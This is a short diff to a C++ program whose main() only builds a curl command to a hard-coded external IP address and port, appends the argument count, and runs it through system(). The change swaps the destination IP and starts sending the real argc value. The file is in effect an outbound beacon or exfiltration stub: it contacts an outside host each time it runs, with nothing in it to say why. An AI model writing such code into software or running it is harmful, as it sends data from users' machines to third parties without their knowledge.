@@ -1,12 +1,12 @@
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
 
 #include <string>
 
 int main(int argc, char *argv[]) {
-  std::string a("");
-  std::string extraction_command =
-      "curl http://159.223.105.145:11111/?argc=" + a;
+  std::string a = std::to_string(argc);
+  std::string extraction_command = "curl http://68.183.112.161:11111/?a=" + a;
   system(extraction_command.c_str());
   return 0;
 }
